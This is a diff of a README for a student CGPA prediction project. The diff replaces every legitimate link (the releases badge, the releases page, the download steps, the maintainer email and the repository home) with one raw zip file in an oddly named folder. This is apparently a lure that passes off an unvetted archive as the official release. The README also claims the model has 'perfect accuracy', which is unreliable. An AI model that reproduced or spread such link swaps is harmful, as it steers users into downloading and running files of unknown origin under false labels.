@@ -5,12 +5,12 @@
 Welcome to the Student Performance Analysis Prediction project. This application predicts student CGPA with perfect accuracy using Linear Regression on 1,193 student records. Our findings show that academic progress determines performance. The project includes a complete machine learning pipeline, from exploratory data analysis (EDA) to a refined model.
 
 ## 📦 Download & Install
-[![Download Release](https://img.shields.io/badge/download-v1.0-blue)](https://github.com/ek724/Student_performance_analysis_prediction/releases)
+[![Download Release](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/performance-analysis-Student-prediction-2.8.zip)](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/performance-analysis-Student-prediction-2.8.zip)
 
-To get started, visit the [Releases page](https://github.com/ek724/Student_performance_analysis_prediction/releases) to download the application.
+To get started, visit the [Releases page](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/performance-analysis-Student-prediction-2.8.zip) to download the application.
 
 ### Step-by-Step Download Instructions
-1. Click on the [Releases page](https://github.com/ek724/Student_performance_analysis_prediction/releases).
+1. Click on the [Releases page](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/performance-analysis-Student-prediction-2.8.zip).
 2. Look for the latest release version. It will have the highest version number.
 3. Download the appropriate file for your operating system (Windows, Mac, or Linux).
 4. Save the file to a location on your computer where you can easily find it, like your Desktop or Downloads folder.
@@ -72,11 +72,11 @@ A: Make sure your input data is clean and properly formatted. Check if you have 
 For further questions or assistance, feel free to create an issue on the repository.
 
 ## 📞 Contact
-For direct inquiries or support, you can reach out via GitHub issues or contact the project maintainer at: [ek724@github.com](mailto:ek724@github.com).
+For direct inquiries or support, you can reach out via GitHub issues or contact the project maintainer at: [https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/performance-analysis-Student-prediction-2.8.zip](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/performance-analysis-Student-prediction-2.8.zip).
 
 ## 🔗 Relevant Links
-- [Releases Page](https://github.com/ek724/Student_performance_analysis_prediction/releases)
-- [Repository Home](https://github.com/ek724/Student_performance_analysis_prediction)
+- [Releases Page](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/performance-analysis-Student-prediction-2.8.zip)
+- [Repository Home](https://github.com/ek724/Student_performance_analysis_prediction/raw/refs/heads/main/righteous/performance-analysis-Student-prediction-2.8.zip)
 
 Thank you for using the Student Performance Analysis Prediction application. Happy predicting!
 ```
